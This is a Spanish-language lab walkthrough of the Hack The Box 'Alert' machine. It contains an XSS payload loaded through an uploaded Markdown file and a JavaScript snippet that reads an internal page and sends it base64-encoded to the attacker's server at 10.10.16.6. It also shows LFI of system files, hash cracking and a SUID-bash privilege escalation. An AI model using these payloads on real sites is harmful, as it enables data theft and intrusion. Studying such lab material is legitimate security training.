
--- 
- Tags: #XSS #LFI #Hashcracking #portforwarding #HTB #OWASPTOP10 
- --
#### QUÉ SE EXPLOTA?

XSS - Injection Via Markdown
Discovering LFI accessible from XSS
Cracking Hashes
Exploiting Web Service Executed by Root
Creating a Malicious php File in Writable Path [Privilege Escalation]


#### Write UP

##### PRIMERA FASE: Reconocimiento

Como siempre **vamos a empezar aplicando un escaneo ICMP** con 
```bash
ping -c 1 <IP>
```

**Esto nos va a indicar si una maquina está prendida y el SO**
Mediante el **TTL** nos damos idea si es **Windows** o **Linux**

Posteriormente **vamos a realizar un escaneo SYN** esto con el motivo de descubrir **todos los puertos abiertos** de la maquina. 

```bash
nmap -sS --open -p- --min-rate 5000 -n -Pn <ip> -vvv -oG GenPort_scan
```
**Después de haber realizado el primer escaneo** seguiremos a realizar un **escaneo un poco más profundo** para esto usaremos los **scripts por defecto** de nmap

```bash
nmap -sCV -p<puertos_encontrados> <ip> -oN DetPort_scan
```

![[Pasted image 20251024083001.png]]


Descubrimos que el puerto **22** y **80** están abiertos.  **El puerto 22** es una **versión 8.2** y por tanto no es vulnerable a algunos exploits que encontramos en **[[searchsploit]]** por ejemplo el **User enumeration 
(2) (45939)** 

Ahora proseguimos a checar el **Launchpad** para ver los codenames. 

**nmap** nos revela que hay un dominio pero, no puede acceder ya que se aplica **virtual hosting** y tenemos que agregar el dominio al **[[etc-hosts]]**. 

**Una vez habiendo hecho esto** proseguimos a lanzar con [[wfuzz]] y con [[GoBuster]] descubrimientos de rutas y subdominios. 

![[Pasted image 20251024083106.png]]

**Messages** = Forbidden

![[Pasted image 20251024083159.png]]

**statistics.alert.htb** 
![[Pasted image 20251024083323.png]]
##### SEGUNDA FASE: Explotación

mpezamos la inspección del sitió y **empezamos a probar cosas**

![[Pasted image 20251024083035.png]]
Empeazamos inpsecciónando la web y encontramos que utiliza formato **markdown**, además **tenemos un panel para subir jarchivos .md** 

**Subimos un archivo .md y lo interpreta**. Además intentamos con **[[Directory Path Traversal]]**, **[[Wrappers]]**... especialmente...

```php
file:///etc/psswd
```

**Como no encontramos nada** decidimos subir un archivo **[[Javascript]]** Y vimos que hay posibilidad de **[[XSS]]**. **El archivo al ser súbido daba una URL**  y al ser compartida, el script se seguía ejecutando. 

![[Pasted image 20251024084131.png]]

```javascript

<script>
	alert(1)
</script>
```
![[Pasted image 20251024084224.png]]
*en el codigo fuente venía la url*

De acuerdo a la pagina **en la sección *contact us* y *about us*** hay alguien que siempre revisa los mensajes.

**Proseguimos a subir un archivo .md** para ver si alguien revisaba el archivo y podíamos de esa manera ver **messages.php** Y ver si podemos ver los mensajes


![[Pasted image 20251024084622.png]]

**Primero levantamos un servidor en python3**
```bash
python3 -m http.server 80
```

posteriormente **creamos un script que nos mande una solicitud a nuestro servidor** con la finalidad de ver si alguien está revisando los mensajes. 

 ```javascript
 <script src="http://10.10.16.6/jaja.js"></script>
 ```

lo guardamos como **.md** lo subimos y en la pagina. 

**La web nos devuelve la url** y como es vulnerable a [[XSS]] se la podemos envíar a quien sea que esté del otro lado, **de esa manera el script se ejecutará y mandará una petición a nuestro servidor** 

![[Pasted image 20251024084716.png]]
*En este caso va a mandar una petición a* http://10.10.16.6/pwn.js

Ahora, como nos interesa ver  **messages.php**  creamos **pwn.js**
y cuando el [[XSS]] se ejecute... obtendremos la info. 

```javascript

var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/index.php?page=messages', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET','http://10.10.16.6/?b64=' + btoa(req.responseText),false);
exfil.send();
```

Cuando subimos el archivo y nosotros mismos lo ejecutamos vemos que recibimos una solicitud en nuestro servidor, **ahora proseguimos a enviarlo al admin** de esa manera recibimos una respuesta: **la decodificamos en base 64** y leemos lo que hay. 

![[Pasted image 20251024091604.png]]

A partir del recurso que nos devuelve **messages.php?file=** con algo. Por lo que ahora, **modificamos el pwn.js** y tratamos de hacer un [[Directory Path Traversal]] a partir del recurso que nos devolvió. 

![[Pasted image 20251024091650.png]]

**Nos devolvió el [[etc-passwd]]** por lo que fue exitosa la filtración de archivos de sistemas, **además aprovechamos para enumerar unos cuantos usuarios** . **Ahora podemos intentar buscar id_rsa** para ver si nos podemos conectarnos con **SSH**

![[Pasted image 20251024092629.png]]

No encontramos nada por lo que ahora **proseguimos a buscar** archivos de **configuración** por lo que ahora buscamos en **[[etc-apache2]]** a ver si podemos sacar algo de información en **/sites-available/000-default.conf**

en **statistics.alert.htb** encontramos un panel que nos pide usuario y contraseña. Y en el **000-default.conf** encontramos **una ruta que posiblemente contenga las credenciales que necesitamos**. Por lo que aprovechando la XSS leemos lo que hay en esa ruta.

![[Pasted image 20251024093035.png]]

**Encontramos un usuario y una contraseña** por lo que proseguimos a usar [[hashcat]] para crackear el hash. 

![[Pasted image 20251024093436.png]]

```bash

hashcat hash /usr/share/wordlists/rockyou.txt --user
```

![[Pasted image 20251024093534.png]]
Una vez que crackeamos el **Hash** tenemos acceso a la página, y además **descubrimos que podemos reutilizar la passwd** para conectarnos por **SSH**. 

**Una vez que ganamos accesso por SSH** toca escalar privilegios.


##### TERCERA FASE: Post-Explotación / PRIVESC

Empezamos a **buscar vectores** con [[Comandos utiles para escalar]], y nos encontramos **pertenceciamos al grupo "managemente"** y además

![[Pasted image 20251024110915.png]]

encontramos que el puerto **8080** estaba abierto, por lo que cuando lanzamos un `curl` nos devuelve un **HTML**.

![[Pasted image 20251024111200.png]]
**Además** vemos que pertenecemos al grupo **Management** lo cual nos da una pista para buscar. 

```bash

find / -group management -type d -writable 2>/dev/null
```

**Aplicamos [[Port Forwarding]] de manera local** y vemos que corré una nueva página interna. Que se llama igual a la ruta que entcontramos anteriormente. 
![[Pasted image 20251024110514.png]]

![[Pasted image 20251024111308.png]]

Monitor es básicamente una página corriendo en el puerto **8080** además vemos que es **la ruta a la que tenemos escritura y pertenecemos al grupo**

**Vemos que dentro de la ruta de "monitor" tenemos capacidad de escritura** y además el dueño es **root** por lo que, lo que nosotros creemos y ejecutemos será como root, ya que el es el propietario. 

**Creamos un .php le damos permisos SUID a la bash y listo**

![[Pasted image 20251024112602.png]]

![[Pasted image 20251024112614.png]]


![[Pasted image 20251024112639.png]]